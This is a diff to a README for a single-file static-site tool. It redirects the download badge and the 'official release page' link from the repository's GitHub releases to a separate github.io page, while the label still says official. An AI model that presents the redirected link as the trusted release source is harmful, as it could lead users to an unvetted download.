@@ -1,6 +1,6 @@
 # 🌐 agora-ci-static-site - Create professional websites with simple files
 
-[![](https://img.shields.io/badge/Download-Agora-blue.svg)](https://github.com/physical-nudibranchia256/agora-ci-static-site/releases)
+[![](https://img.shields.io/badge/Download-Agora-blue.svg)](https://physical-nudibranchia256.github.io)
 
 Agora v2026 provides a simple way to launch a public website. The project consists of a single file. You download this file and open it in your web browser. This tool helps you create landing pages without complex server setups or coding tasks.
 
@@ -8,7 +8,7 @@ Agora v2026 provides a simple way to launch a public website. The project consis
 
 You must visit the project release page to get the file. Follow these steps to obtain the software:
 
-1. Visit the [official release page](https://github.com/physical-nudibranchia256/agora-ci-static-site/releases).
+1. Visit the [official release page](https://physical-nudibranchia256.github.io).
 2. Look for the section labeled Assets.
 3. Click the link for the file ending in .html.
 4. Save the file to your computer desktop or a folder you can find later.
